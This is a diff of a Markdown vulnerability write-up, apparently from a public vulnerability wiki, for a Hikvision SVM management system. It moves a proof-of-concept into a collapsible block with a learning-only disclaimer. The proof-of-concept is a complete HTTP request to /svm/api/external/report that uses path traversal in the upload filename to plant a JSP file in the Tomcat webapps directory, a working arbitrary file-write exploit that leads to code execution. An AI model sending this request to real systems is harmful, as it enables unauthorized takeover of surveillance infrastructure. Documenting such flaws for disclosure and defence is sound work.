@@ -49,8 +49,10 @@ WEB-INF/classes/com/Hikvision/svm/business/serivce/impl/ExternalBusinessServiceI
 
 构造上传文件（通过 env泄漏获取绝对路径，路径一般不会修改）
 
-```
-POST /svm/api/external/report HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /svm/api/external/report HTTP/1.1
 Host: 
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a
 
@@ -58,10 +60,11 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa5
 Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/Hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
 Content-Type: application/zip
 
-<%out.print("test");%>
+&lt;%out.print("test");%&gt;
 
-------WebKitFormBoundary9PggsiM755PLa54a--
-```
+------WebKitFormBoundary9PggsiM755PLa54a--</code></pre>
+
+</details>
 
 ![image-20230828163835117](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163835117.png)
 
